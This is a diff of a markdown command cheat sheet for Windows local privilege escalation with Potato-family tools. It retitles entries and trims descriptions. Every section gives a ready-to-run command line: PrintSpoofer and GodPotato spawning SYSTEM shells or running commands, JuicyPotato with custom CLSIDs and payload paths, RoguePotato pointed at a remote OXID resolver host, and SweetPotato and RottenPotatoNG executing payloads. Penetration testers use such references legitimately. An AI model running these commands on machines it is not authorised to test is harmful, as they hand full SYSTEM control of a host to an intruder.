@@ -4,22 +4,18 @@
 
 ### Interactive SYSTEM shell
 
-Spawn interactive SYSTEM shell with Potato / PrintSpoofer.
-
 Spawn an interactive SYSTEM shell when the Print Spooler impersonation path is available.
 
-```cmd title:"Potato / PrintSpoofer Spawn Interactive SYSTEM Shell"
+```cmd title:"Potato / PrintSpoofer Interactive SYSTEM shell with PrintSpoofer"
 PrintSpoofer.exe -i -c cmd
 ```
 <!-- cheat -->
 
 ### Execute command
 
-Execute command with Potato / PrintSpoofer.
-
 Run a command as SYSTEM.
 
-```cmd title:"Potato / PrintSpoofer Execute Command"
+```cmd title:"Potato / PrintSpoofer Execute command with PrintSpoofer"
 PrintSpoofer.exe -c "$command"
 ```
 <!-- cheat
@@ -30,11 +26,9 @@ var command
 
 ### Execute command 2
 
-Execute command 2 with Potato / PrintSpoofer.
-
 Execute a command as SYSTEM on targets vulnerable to the GodPotato COM/DCOM path.
 
-```cmd title:"Potato / PrintSpoofer Execute Command 2"
+```cmd title:"Potato / PrintSpoofer Execute command with GodPotato"
 GodPotato.exe -cmd "$command"
 ```
 <!-- cheat
@@ -45,11 +39,9 @@ var command
 
 ### Default trigger
 
-Execute default trigger with Potato / PrintSpoofer.
-
 Run a command through JuicyPotato on older Windows builds where the original COM activation path works.
 
-```cmd title:"Potato / PrintSpoofer Execute Default Trigger"
+```cmd title:"Potato / PrintSpoofer Execute command with JuicyPotato"
 JuicyPotato.exe -l $listen_port -p C:\Windows\System32\cmd.exe -a "/c $command" -t *
 ```
 <!-- cheat
@@ -59,11 +51,9 @@ var command
 
 ### Explicit CLSID
 
-Execute explicit CLSID with Potato / PrintSpoofer.
-
 Use a specific CLSID when the default one fails.
 
-```cmd title:"Potato / PrintSpoofer Execute Explicit CLSID"
+```cmd title:"Potato / PrintSpoofer Execute payload with JuicyPotato CLSID"
 JuicyPotato.exe -l $listen_port -p "$payload_path" -t * -c "$clsid"
 ```
 <!-- cheat
@@ -76,11 +66,9 @@ var clsid
 
 ### Execute command 3
 
-Execute command 3 with Potato / PrintSpoofer.
-
 Run RoguePotato with a remote OXID resolver host.
 
-```cmd title:"Potato / PrintSpoofer Execute Command 3"
+```cmd title:"Potato / PrintSpoofer Execute command with RoguePotato"
 RoguePotato.exe -r $lhost -e "$command" -l $listen_port
 ```
 <!-- cheat
@@ -93,11 +81,9 @@ var listen_port
 
 ### Execute payload
 
-Execute payload with Potato / PrintSpoofer.
-
 Execute a prepared payload through SweetPotato.
 
-```cmd title:"Potato / PrintSpoofer Execute Payload"
+```cmd title:"Potato / PrintSpoofer Execute payload with SweetPotato"
 SweetPotato.exe -p "$payload_path"
 ```
 <!-- cheat
@@ -108,11 +94,9 @@ var payload_path
 
 ### Trigger token impersonation
 
-Trigger token impersonation with Potato / PrintSpoofer.
-
 Run RottenPotatoNG, then use token impersonation tooling in the same session.
 
-```cmd title:"Potato / PrintSpoofer Trigger Token Impersonation"
+```cmd title:"Potato / PrintSpoofer Run RottenPotatoNG"
 RottenPotatoNG.exe
 ```
 <!-- cheat -->
